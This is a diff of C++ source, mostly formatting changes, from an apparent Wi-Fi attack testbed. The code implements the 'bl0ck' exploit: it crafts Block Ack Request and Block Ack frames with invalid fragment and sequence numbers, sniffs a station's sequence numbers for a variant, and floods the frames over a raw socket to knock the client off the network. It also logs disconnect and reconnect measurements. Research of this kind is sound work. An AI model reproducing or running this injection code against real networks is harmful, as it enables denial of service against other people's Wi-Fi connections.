@@ -47,11 +47,39 @@ RadioTap get_BAR_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, 
 	bar.fragment_number(fn);
 	bar.start_sequence(sn);
 
-	const vector<uint8_t> payload_data = {
-		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
-	};
-	RadioTap rt{}; //FIXME valid with all adapters? fill with driver?
+	const vector<uint8_t> payload_data = { 0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0x7f,
+		0x92,
+		0x08,
+		0x80 };
+	RadioTap rt{};	   //FIXME valid with all adapters? fill with driver?
 	rt.tx_flags(0x28); // NOSEQ|ORDER
 	return rt / bar / RawPDU(payload_data);
 }
@@ -61,11 +89,39 @@ RadioTap get_BA_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
 	ba.fragment_number(4);			   // invalid FN
 	ba.start_sequence(1175);		   // random invalid SSN
 	ba.bar_control(0x0004);
-	const vector<uint8_t> payload_data = {
-		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
-	};
-	RadioTap rt{}; //TODO at leas noORDER
+	const vector<uint8_t> payload_data = { 0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0xff,
+		0x7f,
+		0x92,
+		0x08,
+		0x80 };
+	RadioTap rt{};	   //TODO at leas noORDER
 	rt.tx_flags(0x28); // NOSEQ|ORDER
 	return rt / ba / RawPDU(payload_data);
 }
@@ -78,27 +134,27 @@ struct BARSContext {
 };
 
 static void bars_sniffer_thread(
-		const HWAddress<6> &sta_mac, const string &iface, BARSContext &ctx, const int timeout_sec) {
+	const HWAddress<6> &sta_mac, const string &iface, BARSContext &ctx, const int timeout_sec) {
 	const string filter = "wlan type data subtype qos-data and wlan addr2 " + sta_mac.to_string();
 
 	components::poll_sniffer_pdu<monostate>(
-			[&](PDU &pdu) -> optional<monostate> {
-				if(ctx.stop.load()) return monostate{};
+		[&](PDU &pdu) -> optional<monostate> {
+			if(ctx.stop.load()) return monostate{};
 
-				const auto *qos = pdu.find_pdu<Dot11QoSData>();
-				if(!qos) return nullopt;
+			const auto *qos = pdu.find_pdu<Dot11QoSData>();
+			if(!qos) return nullopt;
 
-				const uint16_t sn = (qos->seq_num() + 16) % 4096;
-				const uint8_t fn = qos->frag_num();
-				ctx.current_sn.store(sn);
-				ctx.current_fn.store(fn);
-				ctx.has_sn.store(true);
-				log(LogLevel::DEBUG, "BARS: Updated SSN={} FN={}", sn, fn);
-				return nullopt; // continue
-			},
-			iface,
-			filter,
-			seconds(timeout_sec));
+			const uint16_t sn = (qos->seq_num() + 16) % 4096;
+			const uint8_t fn = qos->frag_num();
+			ctx.current_sn.store(sn);
+			ctx.current_fn.store(fn);
+			ctx.has_sn.store(true);
+			log(LogLevel::DEBUG, "BARS: Updated SSN={} FN={}", sn, fn);
+			return nullopt; // continue
+		},
+		iface,
+		filter,
+		seconds(timeout_sec));
 }
 
 // Raw AF_PACKET socket with MSG_DONTWAIT: when the USB TX URB queue is full,
@@ -119,7 +175,7 @@ RawSocket get_unblocking_socket(const string &iface) {
 }
 
 void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_mac, const string &iface, const int frame_in_batch,
-		const string &attack_type, const int duration_sec, const bool is_random, const int ms_interval) {
+	const string &attack_type, const int duration_sec, const bool is_random, const int ms_interval) {
 	assert(attack_type == "BAR" || attack_type == "BA" || attack_type == "BARS");
 
 	log(LogLevel::INFO, "Starting bl0ck exploit - Type: {}", attack_type);
@@ -143,21 +199,17 @@ void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_mac, const string
 		RadioTap frame;
 		if(attack_type == "BAR") {
 			frame = get_BAR_frame(ap_mac, sta_hw);
-		}else if(attack_type == "BA") {
+		} else if(attack_type == "BA") {
 			frame = get_BA_frame(ap_mac, sta_hw);
-		}else {
+		} else {
 			frame = get_BAR_frame(ap_mac, sta_hw, bars_ctx.current_fn.load(), bars_ctx.current_sn.load());
 		}
 
 		const auto bytes = frame.serialize();
 		log(LogLevel::DEBUG, "Sending batch {}", iteration);
 		for(int i = 0; i < frame_in_batch; ++i)
-			sendto(fd,
-					bytes.data(),
-					bytes.size(),
-					MSG_DONTWAIT,
-					reinterpret_cast<const sockaddr *>(&addr),
-					sizeof(addr));
+			sendto(
+				fd, bytes.data(), bytes.size(), MSG_DONTWAIT, reinterpret_cast<const sockaddr *>(&addr), sizeof(addr));
 		interruptible_sleep(milliseconds(ms_interval));
 		iteration++;
 	}
@@ -176,7 +228,7 @@ static Bl0ckResult compute_result(const RunStatus &rs) {
 			for(const auto &conn: conn_times) {
 				if(conn > disc) {
 					r.reconnect_times_ms.push_back(
-							static_cast<double>(duration_cast<milliseconds>(conn - disc).count()));
+						static_cast<double>(duration_cast<milliseconds>(conn - disc).count()));
 					break;
 				}
 			}
@@ -238,8 +290,8 @@ void run_bl0ck_attack(RunStatus &rs) {
 
 	auto [disconnect_count, ap_disconnected, reconnect_times_ms] = compute_result(rs);
 	rs.save_result({ { "disconnect_count", disconnect_count },
-			{ "ap_disconnected", ap_disconnected },
-			{ "reconnect_times_ms", reconnect_times_ms } });
+		{ "ap_disconnected", ap_disconnected },
+		{ "reconnect_times_ms", reconnect_times_ms } });
 }
 
 void stats_bl0ck_attack(const RunStatus &rs) {
@@ -255,23 +307,20 @@ void stats_bl0ck_attack(const RunStatus &rs) {
 	// so they don't appear in attacker_capture.pcap. Use client sniff_iface instead.
 	const string ba_src = rs.actor("client") && rs.get_actor("client")->is_WB() ? "client" : "attacker";
 	observer::tshark::pcap_events(rs,
-			elements,
-			{
-					// ----- protected with MFP (action frames)
-					{ ba_src, "wlan.fixed.action_code == 0x00", "ADDBA req", "blue" },
-					{ ba_src, "wlan.fixed.action_code == 0x01", "ADDBA res", "blue" },
-					{ ba_src, "wlan.fixed.action_code == 0x02", "DELBA", "blue" },
+		elements,
+		{
+			// ----- protected with MFP (action frames)
+			{ ba_src, "wlan.fixed.action_code == 0x00", "ADDBA req", "blue" },
+			{ ba_src, "wlan.fixed.action_code == 0x01", "ADDBA res", "blue" },
+			{ ba_src, "wlan.fixed.action_code == 0x02", "DELBA", "blue" },
 
-					{ ba_src, "(wlan.fc.type_subtype == 0x0018) && (wlan.fixed.ssc.fragment == 4)", "BAR_fn4", "cyan" },
-					{ ba_src,
-							"(wlan.fc.type_subtype == 0x0019) && (wlan.fixed.ssc.fragment == 4)",
-							"BA_fn4",
-							"purple" },
-			});
+			{ ba_src, "(wlan.fc.type_subtype == 0x0018) && (wlan.fixed.ssc.fragment == 4)", "BAR_fn4", "cyan" },
+			{ ba_src, "(wlan.fc.type_subtype == 0x0019) && (wlan.fixed.ssc.fragment == 4)", "BA_fn4", "purple" },
+		});
 
 	if(auto ampdu = observer::trace_cmd::get_bl0ck_logs(rs, "ap"); !ampdu.empty())
 		elements.push_back(make_unique<GraphStairs<observer::trace_cmd::AmpduAction>>(
-				ampdu, observer::trace_cmd::ampdu_action_labels(), "AMPDU", "purple", YAxis::Y2));
+			ampdu, observer::trace_cmd::ampdu_action_labels(), "AMPDU", "purple", YAxis::Y2));
 
 	const path iperf_dir = observer::get_observer_folder(rs, "iperf3");
 	if(auto xy = observer::iperf_log_to_xy(iperf_dir / "ap_iperf3_server.log", "AP-RX", "red"))
